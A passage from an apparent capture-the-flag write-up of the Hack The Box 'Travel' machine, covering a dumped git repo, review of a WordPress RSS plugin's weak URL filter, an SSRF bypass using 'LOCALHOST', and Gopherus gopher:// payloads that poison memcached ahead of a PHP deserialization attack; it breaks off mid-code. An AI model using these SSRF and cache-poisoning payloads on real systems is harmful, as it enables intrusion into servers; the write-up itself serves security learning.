+<span class="c">###########</span>
+
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
+<span class="o">[</span>+] Creating ./.git/
+<span class="o">[</span>+] Downloaded: HEAD
+<span class="o">[</span>-] Downloaded: objects/info/packs
+<span class="o">[</span>+] Downloaded: description
+<span class="o">[</span>+] Downloaded: config
+<span class="o">[</span>+] Downloaded: COMMIT_EDITMSG
+<span class="o">[</span>+] Downloaded: index
+<span class="o">[</span>-] Downloaded: packed-refs
+<span class="o">[</span>+] Downloaded: refs/heads/master
+<span class="o">[</span>-] Downloaded: refs/remotes/origin/HEAD
+<span class="o">[</span>-] Downloaded: refs/stash
+<span class="o">[</span>+] Downloaded: logs/HEAD
+<span class="o">[</span>+] Downloaded: logs/refs/heads/master
+<span class="o">[</span>-] Downloaded: logs/refs/remotes/origin/HEAD
+<span class="o">[</span>-] Downloaded: info/refs
+<span class="o">[</span>+] Downloaded: info/exclude
+<span class="o">[</span>-] Downloaded: /refs/wip/index/refs/heads/master
+<span class="o">[</span>-] Downloaded: /refs/wip/wtree/refs/heads/master
+<span class="o">[</span>+] Downloaded: objects/03/13850ae948d71767aff2cc8cc0f87a0feeef63
+<span class="o">[</span>-] Downloaded: objects/00/00000000000000000000000000000000000000
+<span class="o">[</span>+] Downloaded: objects/b0/2b083f68102c4d62c49ed3c99ccbb31632ae9f
+<span class="o">[</span>+] Downloaded: objects/ed/116c7c7c51645f1e8a403bcec44873f74208e9
+<span class="o">[</span>+] Downloaded: objects/2b/1869f5a2d50f0ede787af91b3ff376efb7b039
+<span class="o">[</span>+] Downloaded: objects/30/b6f36ec80e8bc96451e47c49597fdd64cee2da
+</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel/gitrepo  |master U:3 ✗|
+→ git status
+On branch master
+Changes not staged <span class="k">for </span>commit:
+  <span class="o">(</span>use <span class="s2">"git add/rm &lt;file&gt;..."</span> to update what will be committed<span class="o">)</span>
+  <span class="o">(</span>use <span class="s2">"git restore &lt;file&gt;..."</span> to discard changes <span class="k">in </span>working directory<span class="o">)</span>
+        deleted:    README.md
+        deleted:    rss_template.php
+        deleted:    template.php
+
+no changes added to commit <span class="o">(</span>use <span class="s2">"git add"</span> and/or <span class="s2">"git commit -a"</span><span class="o">)</span>
+</pre></table></code></div></div><p>Looking at the git status we discover three files were deleted from the repo, let retrieve and analyse them:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel/gitrepo  |master U:3 ✗|
+→ git restore README.md rss_template.php template.php
+
+cfx:  ~/Documents/htb/travel/gitrepo  |master ✓|
+→ <span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+drwxr-xr-x 3 root root 4096 Sep 23 00:06 <span class="nb">.</span>
+drwxr-xr-x 5 root root 4096 Sep 22 23:42 ..
+drwxr-xr-x 6 root root 4096 Sep 23 00:06 .git
+<span class="nt">-rwxr-xr-x</span> 1 root root  540 Sep 23 00:06 README.md
+<span class="nt">-rwxr-xr-x</span> 1 root root 2970 Sep 23 00:06 rss_template.php
+<span class="nt">-rwxr-xr-x</span> 1 root root 1387 Sep 23 00:06 template.php
+</pre></table></code></div></div><h2 id="source-code-review">Source Code Review</h2><p>Before analysing the PHP files retrieved from git repo, first lets take a look at the <code class="language-plaintext highlighter-rouge">README.md</code> to understand what the repo is about:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel/gitrepo  |master ✓|
+→ <span class="nb">cat </span>README.md
+<span class="c"># Rss Template Extension</span>
+
+Allows rss-feeds to be shown on a custom wordpress page.
+
+<span class="c">## Setup</span>
+
+<span class="k">*</span> <span class="sb">`</span>git clone https://github.com/WordPress/WordPress.git<span class="sb">`</span>
+<span class="k">*</span> copy rss_template.php &amp; template.php to <span class="sb">`</span>wp-content/themes/twentytwenty<span class="sb">`</span>
+<span class="k">*</span> create logs directory <span class="k">in</span> <span class="sb">`</span>wp-content/themes/twentytwenty<span class="sb">`</span>
+<span class="k">*</span> create page <span class="k">in </span>backend and choose rss_template.php as theme
+
+<span class="c">## Changelog</span>
+
+- temporarily disabled cache compression
+- added additional security checks
+- added caching
+- added rss template
+
+<span class="c">## ToDo</span>
+
+- finish logging implementation
+</pre></table></code></div></div><p>With reference to the <code class="language-plaintext highlighter-rouge">README.md</code> file we understand the following:</p><ul><li>We have discovered the Source code of the RSS feature mentioned on blog.travel.htb</li><li><code class="language-plaintext highlighter-rouge">template.php</code> and <code class="language-plaintext highlighter-rouge">rss_template.php</code> are located inside <code class="language-plaintext highlighter-rouge">wp-content/themes/twentytwenty</code></li><li><code class="language-plaintext highlighter-rouge">logs</code> directory is also located inside <code class="language-plaintext highlighter-rouge">wp-content/themes/twentytwenty</code></li><li>Some <code class="language-plaintext highlighter-rouge">caching</code> mechanism has been added</li><li><code class="language-plaintext highlighter-rouge">Logging</code> functionality is to be implemented</li></ul><h3 id="analyzing-rss_templatephp">Analyzing rss_template.php</h3><p>Lets break the code into four different parts to understand it easily:</p><ul><li>Its including template.php, so all the Classes, Objects &amp; functions from template.php are being used by rss_template.php<div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="cm">/*
+Template Name: Awesome RSS
+*/</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'template.php'</span><span class="p">);</span> <span class="c1">// Include all classes, object &amp; functions from template.php</span>
+<span class="nf">get_header</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div></li><li>The site is using memcache to store the URL generated contents in cache up to 60 seconds and uses <code class="language-plaintext highlighter-rouge">xct_</code> as prefix for the generated key.</li></ul><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$data</span> <span class="o">=</span> <span class="nf">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>  <span class="c1">// Function defined in template.php</span>
+     <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+         <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span> <span class="c1">//memcached data timeout 60 sec &amp; xct_ prefix key</span>
+         <span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>  <span class="c1">// Set location of RSS feed</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
+         <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">handle_content_type</span><span class="p">();</span>
+</pre></table></code></div></div><ul><li>In this part of the code, the URL location for RSS feeds gets defined by <code class="language-plaintext highlighter-rouge">get_feed</code> function taking <code class="language-plaintext highlighter-rouge">url</code> variable value. First it will check if the url is containing <code class="language-plaintext highlighter-rouge">custom_feed_url</code> parameter where it will parse the user control custom URL for the RSS feeds, if the <code class="language-plaintext highlighter-rouge">custom_feed_url</code> parameter isn’t present in the URL request it will use the feed from default location <code class="language-plaintext highlighter-rouge">http://www.travel.htb/newsfeed/customfeed.xml</code> for generating the feeds.</li></ul><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span> <span class="c1">// custom_feed_url parameter</span>
+		<span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span>        <span class="c1">// Input custom url with "="</span>
+		<span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>        
+ 	 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+ 	 	<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>  <span class="c1">// If no custom_feed_url is specified, use this as the default</span>
+ 	 <span class="p">}</span>
+      <span class="nv">$feed</span> <span class="o">=</span> <span class="nf">get_feed</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> <span class="c1">// Set feed to or user-specified (custom_feed_url) or default</span>
+</pre></table></code></div></div><ul><li>In the later part of the code we see, if the <code class="language-plaintext highlighter-rouge">debug</code> parameter was supplied in the <code class="language-plaintext highlighter-rouge">GET request</code>, a <code class="language-plaintext highlighter-rouge">debug.php</code> script gets executed.</li></ul><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="c">&lt;!--
+DEBUG
+</span><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>   <span class="c1">//Displays serialized php object (located at http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php)</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="c">
+--&gt;</span>
+</pre></table></code></div></div><h3 id="analysing-templatephp">Analysing template.php</h3><p>Let’s break this code into three parts:</p><ul><li>The <code class="language-plaintext highlighter-rouge">safe($url)</code> function takes the url value specified in custom_feel_url parameter, decodes the url-encoded string and checks for certain strings in the url to prevent it against LFI, Command Injection and SSRF attacks. Although SSRF filter can be bypassed by either using <code class="language-plaintext highlighter-rouge">0</code> or <code class="language-plaintext highlighter-rouge">LOCALHOST</code> instead of 127.0.0.1 to reach localhost.</li></ul><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// this should be secure</span>
+	<span class="nv">$tmpUrl</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="c1">// Checking if "file://" or "@" is in input to prevent LFI</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="c1">// Checking if "-o" or "-F" is in input to prevent Command Injection</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span> <span class="c1">//Get hostname</span>
+	<span class="c1">// Checking if "localhost" or "127.0.0.1" is used to prevent SSRF</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+	<span class="p">{</span>		
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>		
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><ul><li>Here the function <code class="language-plaintext highlighter-rouge">url_get_contents($url)</code> first calls <code class="language-plaintext highlighter-rouge">safe</code> and <code class="language-plaintext highlighter-rouge">escapeshellarg</code> on the url, and executes it with <code class="language-plaintext highlighter-rouge">shell_exec</code> for <code class="language-plaintext highlighter-rouge">curl</code> to retrive its contents and output is returned.</li></ul><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>  <span class="c1">//command under escapeshellarg("ls") will output as $string = '\'ls\''</span>
+	<span class="cm">/*   //escapeshellarg to protect from command-injection
+	escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to
+	pass a string directly to a shell function and having it be treated as a single safe argument. This function should
+	be used to escape individual arguments to shell functions coming from user input.
+	The shell functions include exec(), system() and the backtick operator.
+	*/</span>
+	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="mf">.</span><span class="nv">$url</span><span class="p">;</span>
+	<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+</pre></table></code></div></div><ul><li>In the last part of the code, we see a <code class="language-plaintext highlighter-rouge">TemplateHelper</code> class which isn’t used anywhere inside the rss_template code, the comments on the top of file indicates it’s the logging functionality which was also mentioned as ToDo in the Readme file.</li></ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="go">/**
+ Todo: finish logging implementation via TemplateHelper
+*/
+</span></pre></table></code></div></div><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">TemplateHelper</span>
+<span class="p">{</span>
+
+    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+    <span class="p">}</span>
+	<span class="c1">// Called upon deserialization!</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+    	<span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="n">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
+    <span class="p">{</span>    	
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/logs/'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Analysing the above code, It initializes a constructor with the <code class="language-plaintext highlighter-rouge">file</code> and it’s <code class="language-plaintext highlighter-rouge">data</code> on <code class="language-plaintext highlighter-rouge">__wakeup()</code> which is a PHP magic function used to re-stablish any database connections that may have been lost during serialization and deserialization tasks. Files retrieved from this request are stored in the <code class="language-plaintext highlighter-rouge">/logs</code> directory, for which the absolute path would be <code class="language-plaintext highlighter-rouge">__DIR__/logs</code> where <strong>DIR</strong> is the directory of the wordpress’s login plugin resolving to <code class="language-plaintext highlighter-rouge">wp-contents/plugins/twentytwenty/logs/</code></p><h2 id="ssrf">SSRF</h2><h3 id="testing-the-custom-feed-functionality">Testing the Custom feed functionality</h3><p>On visiting <a href="http://blog.travel.htb">http://blog.travel.htb</a> we see an awesome rss link on top right, on visiting the link the webpage displays the posts from default customfeed.xml <a href="http://www.travel.htb/newsfeed/customfeed.xml">http://www.travel.htb/newsfeed/customfeed.xml</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/rss.png" alt="rss" /></p><p>Let’s send our IP in the url feed by changing the feed source using parameter <code class="language-plaintext highlighter-rouge">custom_feed_url</code> from <code class="language-plaintext highlighter-rouge">rss_template.php</code> and confirm if the server can connect back to us.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/feed.png" alt="feed" /></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.189 - - <span class="o">[</span>20/Sep/2020 23:42:55] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+10.10.10.189 - - <span class="o">[</span>20/Sep/2020 23:42:55] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+10.10.10.189 - - <span class="o">[</span>20/Sep/2020 23:42:56] <span class="s2">"GET /rss_template.php HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>Great ! It works, we have a potential SSRF, now lets check out the debug parameter functionality.</p><p>If we pass <code class="language-plaintext highlighter-rouge">debug</code> parameter in the url as <a href="http://blog.travel.htb/awesome-rss/?debug">http://blog.travel.htb/awesome-rss/?debug</a> the webpage displayed is the same, but instead we get a addition of html comments in the source of the page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/debug.png" alt="debug" /></p><p>Looking at the workflow, First we visited the awesome-rss page where the feed got cached and as we supplied debug parameter in the url and <code class="language-plaintext highlighter-rouge">debug.php</code> script got executed generating debug comments at the source of the page.</p><p>The debug output shows a <code class="language-plaintext highlighter-rouge">PHP serialized object</code> along with a key name which seems to be generated using <code class="language-plaintext highlighter-rouge">$simplepie-&gt;set_cache_location('memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_');</code> line we saw in rss_template.php as we can the prefix as <code class="language-plaintext highlighter-rouge">xct_</code> matches with debug output <code class="language-plaintext highlighter-rouge">xct_4e5612ba07(...)</code></p><h3 id="memcache-poisoning">Memcache Poisoning</h3><p>Since we have already confirmed SSRF vulnerability lets proceed with the exploitation.</p><p>Lets try to smuggle our crafted request to the backend memcache service running on the server using <code class="language-plaintext highlighter-rouge">custom_feed_url</code> parameter which will be parsed by curl.<code class="language-plaintext highlighter-rouge">safe()</code> function won’t allow us to <code class="language-plaintext highlighter-rouge">file://</code> protocol but instead a better alternative would be to use <code class="language-plaintext highlighter-rouge">gopher://</code> protocol.</p><p>Reasons behind using <code class="language-plaintext highlighter-rouge">gopher</code> and not other protocols like <code class="language-plaintext highlighter-rouge">http</code>:</p><ul><li>Gopher doesn’t send HTTP headers like <code class="language-plaintext highlighter-rouge">Host &amp; User-Agent: curl</code> which would probably mess up the connection with the memcache service.</li><li>It will provide clean output and allow us to interact with memcache service by sending precise memcache commands to the server without any junk.</li><li>Gopher protocol is often used to construct post packets to attack intranet applications. In fact, the construction method is very simple, similar to http protocol and is one of the famous protocol used in SSRF attacks.</li></ul><p>I found a very good blog which explains why it’s preferred to use gopher protocol for SSRF attacks <a href="https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html"><strong>here</strong></a></p><h3 id="bypassing-filters-and-testing-gopher">Bypassing filters and testing Gopher</h3><p>Let’s use <a href="https://github.com/tarunkant/Gopherus"><strong>Gopherus</strong></a> tool to craft our gopher payloads and confirm if we can bypass the filters and use Gopher to send our crafted payloads.</p><p>First we will send our request using gopher without any payload just to check if the server can handle gopher protocol requests, we’ll also use <code class="language-plaintext highlighter-rouge">LOCALHOST</code> to bypass safe function filters.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/gopher.png" alt="gopher" /></p><p>As we can see it didn’t trigger any error and we were able to bypass localhost filter, now let’s use <code class="language-plaintext highlighter-rouge">Gopherus</code> to generate a payload for phpmemcache and test it out.</p><h4 id="gopherus">Gopherus</h4><p>By default Gopherus uses <code class="language-plaintext highlighter-rouge">SpyD3r</code> as key, for testing purpose we won’t be using any serialized payloads value, instead we will use value as <code class="language-plaintext highlighter-rouge">Coldfusion</code> just to confirm if we are able to write to memcache.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/travel
+→ /opt/Gopherus/gopherus.py <span class="nt">--exploit</span> phpmemcache
+
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   <span class="se">\ </span> ___ /  _ <span class="se">\\</span>____ <span class="se">\|</span>  |  <span class="se">\_</span>/ __ <span class="se">\_</span>  __ <span class="se">\ </span> |  <span class="se">\/</span>  ___/
+<span class="se">\ </span>   <span class="se">\_\ </span> <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  |_&gt; <span class="o">&gt;</span>   Y  <span class="se">\ </span> ___/|  | <span class="se">\/</span>  |  /<span class="se">\_</span>__ <span class="se">\</span>
+ <span class="se">\_</span>_____  /<span class="se">\_</span>___/|   __/|___|  /<span class="se">\_</span>__  <span class="o">&gt;</span>__|  |____//____  <span class="o">&gt;</span>
+        <span class="se">\/</span>       |__|        <span class="se">\/</span>     <span class="se">\/</span>                 <span class="se">\/</span>
+
+                author: <span class="nv">$_SpyD3r_</span><span class="err">$</span>
+
+
+This is usable when you know Class and Variable name used by user
+
+Give serialization payload
+example: O:5:<span class="s2">"Hello"</span>:0:<span class="o">{}</span>   : Coldfusion
+
+Your gopher <span class="nb">link </span>is ready to <span class="k">do </span>SSRF :
+
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2010%0d%0aColdfusion%0d%0a
+
+After everything <span class="k">done</span>, you can delete memcached item by using this payload:
+
+gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
+
+<span class="nt">-----------Made-by-SpyD3r-----------</span>
+</pre></table></code></div></div><p>We’ll send the generated payload in the custom_feed_url replacing <code class="language-plaintext highlighter-rouge">127.0.0.1</code> with <code class="language-plaintext highlighter-rouge">LOCALHOST</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/burpgo.png" alt="burpgo" /></p><p>Now we will execute the <code class="language-plaintext highlighter-rouge">debug.php</code> script located at <a href="http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php">http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</a> and confirm that we were successfully able to write and inject our value inside memcache.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Travel/burpgo1.png" alt="burpgo1" /></p><h3 id="memcache-encoded-key">Memcache encoded key</h3><p>Before we move ahead to <code class="language-plaintext highlighter-rouge">PHP deserialization attack</code> we need to find the full encoded key for the memcache poisoning which will be deserialized when we visit the awesome rss page with custom_feed_url parameter. While testing the custom feed functionality we saw the output of the debug script generated started with <code class="language-plaintext highlighter-rouge">xct_4e5612ba07(...)</code> when the default customfeed.xml was parsed by <code class="language-plaintext highlighter-rouge">get_feed</code> function.</p><p>Based on the following lines in source code:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
+<span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span> <span class="c1">//Set location of RSS feed</span>
+<span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
+</pre></table></code></div></div><p>We understand the php code sets up the cache with <code class="language-plaintext highlighter-rouge">prefix=xct_</code> which matches with <code class="language-plaintext highlighter-rouge">xct_4e5612ba07(...)</code>, but as the appending output is truncated we still need to figure out the complete hash.</p><p>Let’s look the source code of <a href="https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcache.php"><strong>Memcache.php</strong></a> which is the simplepie code for memcache.</p><p>Below is the <a href="https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99"><strong>snippet</strong></a> from the memcache.php:</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="cd">/**
+ * Create a new cache object
